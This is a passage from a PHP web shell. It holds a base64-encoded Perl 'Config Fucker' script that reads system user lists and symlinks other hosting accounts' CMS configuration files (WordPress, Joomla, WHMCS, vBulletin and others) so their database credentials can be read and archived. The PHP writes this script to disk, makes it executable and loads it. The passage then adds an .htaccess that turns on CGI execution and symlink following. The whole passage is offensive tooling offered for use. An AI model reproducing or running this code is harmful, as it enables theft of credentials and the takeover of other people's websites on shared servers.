c2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW1zLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnVwbG9hZC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbC9jb25maWcucGhwJywkZG9tYWluLid+fj5tYWxheS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsZW50cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50Mi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYTEuc2h0bWwnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJGRvbWFpbi4nfj5EcnVwYWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2UxMDdfY29uZmlnLnBocCcsJGRvbWFpbi4nfj5lMTA3LnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9kYXRhcy9jb25maWcucGhwJywkZG9tYWluLid+PlNlZGl0aW8uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TU0kucGhwJywkZG9tYWluLid+fj5DTUYtZm9ydW0uc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkIuc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi1mb3J1bS5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk90aGVyLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywkZG9tYWluLid+fj5pbnZpc2lvLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+QmFsaXRiYW5nLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnRzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5nLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5ncy5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlBocEJCLWZvcnVtLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGRvbWFpbi4nfn4+cGhwYmIzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htY3Muc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG0uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRkb21haW4uJ35+PndobWNzMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5tYW5nZXdobWNzLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PldobTkuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnRzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2Uuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2VzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLXNob3BwaW5nLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FtZW1iZXIvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d3AxMy1wcmVzcy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3Muc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd2ViLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ibG9ncy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtaG9tZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1wcm90YWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+b3JkcHJlc3Mtc2l0ZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbWFpbi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtdGVzdC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXByb3RhbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1zaXRlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbWFpbi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3Muc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ldy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52YjMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+cGFuZWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3Quc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3Rpbmcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLVpDc2hvcC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtcy5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGVudHMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnL2tvbmVrc2kucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWExLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLnNodG1sJyk7DQp9DQppZiAoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAnUE9TVCcpIHsNCiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQp9IGVsc2Ugew0KICAkYnVmZmVyID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAoQHBhaXJzKSB7DQogICgkbmFtZSwgJHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOw0KICAkbmFtZSA9fiB0ci8rLyAvOw0KICAkbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkdmFsdWUgPX4gdHIvKy8gLzsNCiAgJHZhbHVlID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICRGT1JNeyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIiBiZ2NvbG9yPSIjMDAwMDAwIj4NCjxwPkNvbmZpZyBGdWNrZXI8L3A+DQo8cD48Zm9udCBjb2xvcj0iI0MwQzBDMCI+WzwvZm9udD4gQ29kZWQgQnkgPGZvbnQgY29sb3I9IiNGRjAwMDAiPlgtMU43M0NUPC9mb250Pjxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9mb250Pg0KPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCjx0ZXh0YXJlYSBuYW1lPSJwYXNzIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgIzAwZmYwMDsgd2lkdGg6IDU0M3B4OyBoZWlnaHQ6IDQyMHB4OyBiYWNrZ3JvdW5kLWNvbG9yOiMwQzBDMEM7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjhwdDsgY29sb3I6I0ZGMDAwMCIgID48L3RleHRhcmVhPjwvcD4NCjxwIGFsaWduPSJjZW50ZXIiPg0KPGlucHV0IG5hbWU9InRhciIgdHlwZT0idGV4dCIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICNGRjAwMDA7IHdpZHRoOiAyMTJweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiNGRjAwMDA7ICIgIC8+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+DQo8aW5wdXQgbmFtZT0iU3VibWl0MSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR0VUIENPTkZJRyAhIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgI0ZGMDAwMDsgd2lkdGg6IDk5OyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZToxMHB0OyBjb2xvcjojNTlFODE3OyB0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7IGhlaWdodDoyMzsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDIiAvPjwvcD4NCjwvZm9ybT4nOw0KfWVsc2V7DQpAbGluZXMgPTwkRk9STXtwYXNzfT47DQokeSA9IEBsaW5lczsNCm9wZW4gKE1ZRklMRSwgIj50YXIudG1wIik7DQpwcmludCBNWUZJTEUgInRhciAtY3pmICIuJEZPUk17dGFyfS4iLnRhciAiOw0KZm9yICgka2E9MDska2E8JHk7JGthKyspew0Kd2hpbGUoQGxpbmVzWyRrYV0gID1+IG0vKC4qPyk6eDovZyl7DQombGlsKCQxKTsNCnByaW50IE1ZRklMRSAkMS4iLnR4dCAiOw0KZm9yKCRrZD0xOyRrZDwxODska2QrKyl7DQpwcmludCBNWUZJTEUgJDEuJGtkLiIudHh0ICI7DQp9DQp9DQogfQ0KcHJpbnQnPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0iIzAwMDAwMCI+DQo8cD5Zb3UgZ290IGl0ISE8YnI+PGJyPjxicj48Zm9udCBjb2xvcj0iI0MwQzBDMCI+WzwvZm9udD4gQ29kZWQgQnkgPGZvbnQgY29sb3I9IiNGRjAwMDAiPlgtMU43M0NUPC9mb250Pjxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9mb250PjwvcD4NCjxwPiZuYnNwOzwvcD4nOw0KaWYoJEZPUk17dGFyfSBuZSAiIil7DQpvcGVuKElORk8sICJ0YXIudG1wIik7DQpAbGluZXMgPTxJTkZPPiA7DQpjbG9zZShJTkZPKTsNCnN5c3RlbShAbGluZXMpOw0KcHJpbnQnPHA+PGEgaHJlZj0iJy4kRk9STXt0YXJ9LicudGFyIj48Zm9udCBjb2xvcj0iIzAwRkYwMCI+DQo8c3BhbiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lIj5DbGljayBIZXJlIFRvIERvd25sb2FkIFRhciBGaWxlPC9zcGFuPjwvZm9udD48L2E+PC9wPic7DQp9DQp9DQogcHJpbnQiDQo8L2JvZHk+DQo8L2h0bWw+Ijs=';
		$file = fopen("tempik.pl","w+");
		$write = fwrite ($file ,base64_decode($lcf));
	fclose($file);
	
	chmod("tempik.pl",0755);
	echo "<iframe src=LCF/lcf.pl width=97% height=100% frameborder=0></iframe>
   </div>";
} 
#==================[ Multi BConfig Fucker ]==================#

if(isset($_POST['perlconfig']))
{
echo "<center/><b><font color=>[ Perl Config Fucker Priv8 ]</font></b><br><br>";
  mkdir('multi_config', 0755);
    chdir('multi_config');
	 $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Error!");
        $metin = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .pl \n AddHandler cgi-script .pl \n AddHandler cgi-script .pl";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);

